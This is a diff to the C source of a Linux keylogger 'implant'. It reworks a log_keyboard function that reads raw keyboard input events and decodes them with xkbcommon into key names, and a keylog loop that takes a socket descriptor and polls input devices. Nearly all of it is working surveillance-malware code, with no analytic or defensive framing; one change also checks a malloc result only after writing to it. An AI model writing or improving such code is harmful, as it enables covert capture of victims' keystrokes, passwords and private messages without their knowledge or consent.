@@ -1,6 +1,7 @@
 
 #include "implant.h"
 #include <alloca.h>
+#include <stdlib.h>
 #include <bits/types/struct_timeval.h>
 #include <linux/input-event-codes.h>
 #include <stddef.h>
@@ -12,6 +13,7 @@
 #include <sys/types.h>
 #include <unistd.h>
 #include <stdbool.h>
+#include <string.h>
 #include <xkbcommon/xkbcommon.h>
 
 
@@ -25,10 +27,9 @@ static int get_highest_fd(implant_t *instance) {
     return highest_fd;
 }
 
-static int log_keyboard(int fd, struct xkb_state *state, char *key_desc_ptr[STRING_BUFFER_SIZE]) {
+static int log_keyboard(int fd, struct xkb_state *state, char **key_desc_ptr) {
     struct input_event evt = {0};
     static bool shift_pressed = false;
-
 
 
     /*
@@ -40,6 +41,11 @@ static int log_keyboard(int fd, struct xkb_state *state, char *key_desc_ptr[STRI
     */
 
     ssize_t bytes_read = read(fd, &evt, sizeof(evt));
+#ifdef DEBUG
+        DEBUG_LOG("[!] read %ld bytes", bytes_read);
+#endif
+
+
     if (bytes_read != sizeof(evt)) {
 
 #ifdef DEBUG
@@ -73,16 +79,19 @@ static int log_keyboard(int fd, struct xkb_state *state, char *key_desc_ptr[STRI
             2) add check for which library is installed & add abstraction layer
         */
 
+
         xkb_keysym_t keysym = xkb_state_key_get_one_sym(state, evt.code + 8);
 
         if (shift_pressed)
             keysym = xkb_keysym_to_upper(keysym);
 
+        memset(*key_desc_ptr, 0, STRING_BUFFER_SIZE);
         xkb_keysym_get_name(keysym, *key_desc_ptr, STRING_BUFFER_SIZE);
 
-#ifdef DEBUG
-        printf("[+] Key pressed: %s\n", *key_desc_ptr);
-#endif
+        if (!strcmp("space", *key_desc_ptr)) {
+            memset(*key_desc_ptr, 0, STRING_BUFFER_SIZE);
+            *key_desc_ptr[0] = ' ';
+        }
 
     }
 
@@ -210,13 +219,18 @@ void keylog(implant_t *instance, int sockfd) {
             /* checking for new input here */
             if (FD_ISSET(it->fd, &rd)) {
 
-                char key_desc[STRING_BUFFER_SIZE] = {0};
+                char *key_desc = malloc(sizeof(char) * (STRING_BUFFER_SIZE + 1));
+                memset(key_desc, 0, STRING_BUFFER_SIZE);
+
+                if (!key_desc) {
+                    goto LOG_FUNCTION_CLEANUP;
+                }
 
                 /*
                     should we really kill the run here or can we recover this ?
                     i need to run some tests before making a decision.
                 */
-                if (ERROR == log_keyboard(it->fd, state, (char **)&key_desc))
+                if (ERROR == log_keyboard(it->fd, state, &key_desc))
                     goto LOG_FUNCTION_CLEANUP;
 
 
